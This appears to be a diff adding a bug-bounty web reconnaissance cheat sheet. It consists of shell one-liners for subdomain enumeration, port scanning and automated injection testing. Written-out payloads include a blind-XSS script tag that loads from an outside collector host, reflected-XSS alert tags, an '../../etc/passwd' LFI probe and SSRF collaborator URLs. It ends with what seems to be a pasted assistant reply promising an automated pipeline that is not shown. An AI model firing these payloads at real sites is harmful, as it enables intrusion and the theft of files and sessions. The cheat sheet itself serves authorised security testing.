@@ -1,0 +1,160 @@
+Advanced Web Reconnaissance Methodology (2025+ Edition)
+
+🌎 Subdomain Enumeration
+
+subfinder -d http://example.com -all -recursive -t 100 -silent | anew subdomains.txt
+puredns resolve subdomains.txt -r resolvers.txt | anew resolved_subdomains.txt
+
+WHY: puredns = mass + accurate brute + wildcard filtering. Use anew to append only new results for iterative scans.
+
+⸻
+
+🚦 Live Hosts Discovery (Smart Probing)
+
+cat resolved_subdomains.txt | httpx -ports 80,443,8443,8080,8000,8888,3000,5000,10000 -threads 300 -status-code -web-server -title -tech-detect -json | tee live_hosts.json
+
+WHY: Use extra ports, server detection, and JSON output for automation.
+
+⸻
+
+📦 Passive + Active URL Collection
+
+cat resolved_subdomains.txt | waybackurls | anew wayback.txt
+cat resolved_subdomains.txt | gau --threads 100 | anew gau.txt
+cat resolved_subdomains.txt | katana -d 5 -ps -jc -fx | anew katana.txt
+cat wayback.txt gau.txt katana.txt | sort -u | anew all_urls.txt
+
+WHY: Combine all sources for maximum coverage, de-duplicated.
+
+⸻
+
+🧹 Sensitive Files + Extensions Discovery
+
+cat all_urls.txt | grep -iE '\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|gz|bak|rar|7z|log|cache|secret|db|backup|yml|config|csv|yaml|md|env|ini)$' | anew sensitive_files.txt
+
+WHY: Grepping extensions to hunt for public secrets/data leaks.
+
+⸻
+
+🧩 URL Sorting & Parameter Discovery
+
+cat all_urls.txt | uro | anew deduped_urls.txt
+cat deduped_urls.txt | grep "=" | qsreplace 'FUZZ' | anew param_urls.txt
+
+WHY: Focus only on URLs with parameters, ready for fuzzing.
+
+⸻
+
+🧱 Hidden Parameters (Arjun & Wordlist)
+
+arjun -i param_urls.txt -oT arjun_params.txt -t 50 --passive
+
+WHY: Finds undocumented parameters via passive techniques.
+
+⸻
+
+🎯 XSS Discovery (Blind + Reflected)
+
+cat param_urls.txt | qsreplace '<script src=https://xss.report/c/coffinxp></script>' | httpx -mc 200 -mr '<script src=https://xss.report/c/coffinxp></script>' -threads 100
+
+WHY: Blind XSS test via collaborator on all param URLs.
+
+echo http://example.com | gau | gf xss | uro | Gxss | kxss | anew xss_candidates.txt
+
+WHY: Combined gf + Gxss + kxss → Reflected XSS hunting.
+
+⸻
+
+🧬 LFI/SSRF/FUZZ (FFUF Advanced)
+
+ffuf -w wordlists/lfi.txt -u https://example.com/index.php?page=FUZZ -mc 200 -ac -t 100 -c
+
+WHY: Use specific wordlists, aggressive + smart matching.
+
+cat urls.txt | grep '&' | qsreplace 'http://burpcollab.com' | httpx -mc 200
+
+WHY: SSRF simple header injection test.
+
+⸻
+
+🧹 Directory Bruteforce (Stealth + Advanced)
+
+ffuf -w wordlists/directory-list-2.3-medium.txt -u https://example.com/FUZZ -t 200 -ac -recursion -recursion-depth 3 -e .php,.bak,.old,.conf,.log -fc 404,403 -c
+
+WHY: Recursive, stealthy, extension + status-code smart filter.
+
+⸻
+
+🗺️ JS Files Hunting & Analysis
+
+cat all_urls.txt | grep -Ei '\.js$' | httpx -mc 200 -content-type | anew jsfiles.txt
+cat jsfiles.txt | nuclei -t exposures/ | anew js_leaks.txt
+
+WHY: Grab JS → use Nuclei for leak detection → auto hunting.
+
+⸻
+
+⚙️ Subdomain Takeover
+
+subzy run --targets resolved_subdomains.txt --concurrency 100 --hide_fails --verify_ssl
+
+⸻
+
+🌐 CORS Misconfigurations
+
+python3 http://corsy.py -i live_hosts.json -t 50 --headers 'User-Agent: GoogleBot\nCookie: SESSION=Owned'
+
+⸻
+
+🧹 Content-Type Filter (For Upload / RCE Paths)
+
+cat gau.txt | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|cgi)$' | httpx -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'
+
+⸻
+
+🔎 Shodan, Public Intelligence
+
+http://ssl.cert.subject.CN:"http://example.com" port:443
+
+⸻
+
+📊 Naabu + Nmap + Masscan (Ports + Services)
+
+naabu -list resolved_subdomains.txt -p - -c 100 -o ports.txt
+masscan -p1-65535 x.x.x.x --rate 100000 -oG masscan.txt
+nmap -p- -A -iL ports.txt -oA fullnmap
+
+⸻
+
+🧠 Bonus: Smart Automation for XSS + LFI + SSRF
+
+cat param_urls.txt | gf xss | qsreplace '<script>alert(1)</script>' | httpx -mc 200 -mr '<script>alert(1)</script>' | anew xss_found.txt
+cat param_urls.txt | gf lfi | qsreplace '../../../../etc/passwd' | httpx -mc 200 -mr 'root:x' | anew lfi_found.txt
+cat param_urls.txt | qsreplace 'http://burpcollab.com' | httpx -mc 200 -mr 'burpcollab' | anew ssrf_found.txt
+
+WHY: Automated pipelines to validate reflected XSS, LFI, and SSRF.
+
+⸻
+
+✅ Best Practices (2025+ Focus)
+•Use multiple sources always (passive + active + js + archive)
+•Always deduplicate (uro, urldedupe, anew)
+•Automate pipeline chaining for scale
+•Blind XSS and SSRF are easiest bounty opportunities → Automate
+•Track progress via JSON or append files for later post-processing
+•Use Collaborators + interactsh for OOB (Out of Band) detection
+•Update tools + templates regularly for latest techniques
+
+⸻
+
+Perfect — now let’s make ELITE VERSION (AUTOMATED RECON PIPELINE).
+This will be Fully Automated, Self-Updating, Chainable, and ready for huge recon scale (bug bounty / private programs / long term recon).
+
+🚨 ELITE RECON PIPELINE (ULTRA VERSION)
+
+✅ Bash + Python Hybrid
+✅ Chain ALL tools + auto deduplicate
+✅ Auto-scan + validate XSS / LFI / SSRF / Sensitive files
+✅ Auto Subdomain takeover check
+✅ Auto daily cronjob ready
+✅ Auto notify via Discord/Slack
